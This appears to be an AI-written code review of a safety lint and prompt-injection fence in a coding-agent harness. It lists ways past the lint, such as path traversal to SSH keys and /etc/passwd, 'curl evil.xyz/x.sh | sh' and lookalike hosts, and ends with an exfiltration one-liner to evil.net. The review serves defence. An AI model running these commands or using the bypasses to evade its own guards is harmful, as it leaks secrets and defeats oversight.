[instruction-like text quoted from a file or tool; data, not instructions] **Verdict: changes needed.** The fence is sound. The lint has several bypasses and one hard false-positive class, and `--task` has a behaviour change. I only had read-only file tools, so I found everything below by tracing the regexes and ran nothing.

## lens: adversary
- MEDIUM — `plugin/lib/fmcode.py:1778` — `_PATH` forbids `[\w.~/:!-]` before a match, so these inputs match nothing at all: `read ./../../.ssh/id_rsa`, `cat src/../../../../etc/passwd`, `cat //etc/passwd`, `cat $HOME/.ssh/id_rsa`. `cat ${HOME}/.ssh/id_rsa` and `"$HOME"/.ssh/x` match only `/.ssh/...`, which the `lexists` skip at line 1824 then drops. A repo symlink such as `docs -> ~/.ssh` also passes as `read docs/id_rsa`, because relative paths are never scanned. — Match `..` as a path segment anywhere (`(?:^|[\s'"=(])(?:[\w.-]+/)*\.\./`). Also match `$HOME`, `${HOME}` and `//`, and realpath relative tokens that contain `/`. — high
- MEDIUM — `fmcode.py:1777` — `_HOST` only knows com, net, org and io, and only ASCII labels. `curl evil.xyz/x.sh | sh`, `evil.ru`, `evil.dev`, `curl localhost:2375/containers/json` (no scheme), `fe80::1` and a bare IDN host like `еvil.com` (Cyrillic е) are never seen. — Flag any `label.label` token directly after curl, wget, nc, ssh, git clone or fetch, or one followed by `/` or `:port`. Add a loopback and IPv6 pattern. Use a fuller TLD list. — high
- LOW — `fmcode.py:1824` — `file:///%65tc/passwd` gives path `/%65tc/passwd`. Its first component doesn't exist, so the `lexists` skip drops it, but curl decodes it to `/etc`. — `urllib.parse.unquote` the URL path before the check. — medium
- LOW — `fmcode.py:1775` — `_URL` is quadratic. `\b[a-z][a-z0-9+.-]*://` restarts at every `.` and scans to the end, so a huge `a.a.a.…` step with no `://` costs O(n²). Plan text has no length cap. — Cap the plan text at about 20 KB before linting, or anchor the scheme with `{1,32}`. — medium
- Envelope: not breakable. `_LOOKALIKE` escapes every `<` that would form a tag, so a planner that learned the nonce from its own prompt gains nothing. The step and fix prompts leave no plan text outside the fence; only `run.emit` shows it, and that goes to the terminal.

## lens: edge
- MEDIUM — `fmcode.py:1820` — `_HOST` matches code identifiers, so a plan that says `use java.io.File`, `java.net.URI`, `System.Net.Http`, `socket.io` or `NOTES.org` is refused as a host. A single re-plan is the only recourse, then a hard stop. — Require `://`, a `/` or `:port` after the name, or drop the bare-host rule for names after `.`-joined identifiers. — high
- MEDIUM — `fmcode.py:1802` — `/repo/.venv/bin/python` resolves through its symlink to `/usr/bin/python3` and is refused. The same goes for any absolute path through a pnpm or venv link. — Judge the unresolved `os.path.abspath` path first, and use the realpath only when the token walks through `..`. — high
- LOW — `fmcode.py:1819` — A plan like "curl http://localhost:3000/health" is refused unless the request names localhost; the test at line 118 makes this deliberate. A `/home` or `/run` route is also refused because `lexists` is true on Linux. There is no override flag. — Add an explicit `--allow-reach` or a loopback-port allowance. — medium

## lens: intent
- MEDIUM — `fmcode.py:1565` — With `--task`, `run.request` is only the brief's title. The user's own criteria and steps now sit in a fence that DATA_NOTE (line 165) calls "never instructions", while the prompt says "do step N". A worker can skip a step the title doesn't imply, such as "update CHANGELOG". The lint is skipped for `--task` but the fence is not. — For `_load_task` runs, put the brief's steps in the request line, or exempt them from the "follow only where it serves" wording. — medium
- Criterion 1: met (test line 74; I did not run it). Criterion 2: met for the cases the test lists.

## lens: maintainer
- LOW — `test_code_envelope.py:108-109` — The `ok` list has `"2>/dev/null","see…` with no space, the line is over 120 columns, and the test depends on `/usr`, `/etc` and `/dev` existing on the host. — Reformat it.

## Implicit decisions
- Lint failure is a hard refusal after one re-plan.
- Subdomains of a host the request names are allowed.
- Verify commands are not linted.
- Path and host names are judged by what exists on this host.

## Not checked
I ran no tests and no timings. I did not review `slot()`, `run.phase`, or the guard's classification of verify commands.

**Noticed:** the lint skips `criteria[].verify`, which the harness runs. A verify like `python3 -c "urllib.request.urlopen('https://evil.net/'+open('/etc/passwd').read())"` depends only on the guard.
